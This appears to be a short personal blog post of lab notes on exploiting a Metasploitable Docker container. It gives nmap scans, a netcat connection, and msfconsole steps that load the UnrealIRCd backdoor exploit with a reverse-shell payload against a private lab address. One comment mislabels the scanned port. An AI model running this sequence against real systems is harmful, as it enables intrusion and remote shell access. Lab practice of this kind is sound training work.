---
layout: ../../layouts/MarkdownPostLayout.astro
title: 'Metasploit(able) Notes'
pubDate: '2026-04-01'
description: ''
type: 'Cybersecurity'
author: ''
image:
    url: ''
    alt: ''
    width: ''
tags: []
---

## Docker commands
```bash
# List all containers (and get container_name)
docker ps -a

# Start metasploitable
# -a = attach
# -i = interactive
docker start -ai metasploitable

# Restart container
docker restart <container_name>
```

## Terminal commands
```bash
# Scan every port from 0 to 65535
nmap -p0-65535 172.17.0.2

# Scan port 21 for vulnerabilities
nmap 172.17.0.2 --script vuln -p 6667
```

## Open a connection with Netcat
```bash
nc 172.17.0.2 6667
```

## msfconsole commands
```bash
# Run metasploit
msfconsole

# Search the Metasploit library for the exploit
search irc

# Load the module
use exploit/unix/irc/unreal_ircd_3281_backdoor

# View loaded exploit's settings
options

# Set the remote host (target)
set RHOSTS 172.17.0.2

# Show what you can deliver with the loaded exploit
show payloads

# Set a payload that attempts to establish a reverse shell connection from a Unix-based target system back to a listener using outbound connection
set PAYLOAD cmd/unix/reverse

# Set the address to connect to for a payload to connect back to such as a reverse shell
set LHOST 172.17.0.1 | unset LHOST
exploit|run
```